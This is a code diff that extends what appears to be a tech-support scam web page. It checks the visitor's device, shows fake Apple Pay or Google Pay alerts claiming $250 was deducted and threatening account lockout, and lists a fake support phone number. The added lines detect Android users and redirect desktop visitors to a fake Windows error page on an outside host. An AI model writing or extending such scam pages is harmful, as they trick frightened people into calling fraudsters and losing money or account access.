@@ -73,6 +73,10 @@
       return /iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
 
+    function isAndroid() {
+      return /Android/i.test(navigator.userAgent);
+    }
+
     function triggerFullScreen() {
       if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen();
@@ -105,7 +109,7 @@
         document.getElementById("line3").innerText = "Confirm this transaction or your account will be locked.";
         document.getElementById("phone").innerHTML =
           '📞 <a href="tel:+18447092550">Call Apple Support: +1-844-709-2550</a>';
-      } else {
+      } else if (isAndroid()) {
         document.getElementById("logo").src = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg";
         document.getElementById("title").innerText = "Google Pay - Payment Alert";
         document.getElementById("line1").innerText = "$250.00 has been deducted from your Google Pay.";
@@ -113,6 +117,9 @@
         document.getElementById("line3").innerText = "Verify now to avoid Google account suspension.";
         document.getElementById("phone").innerHTML =
           '📞 <a href="tel:+18447092550">Call Google Support: +1-844-709-2550</a>';
+      } else {
+        // Redirect to winerror-one-arrow.html on desktop
+        window.location.href = "https://multi-i1iu.onrender.com/winerror-one-arrow.html";
       }
     });
 
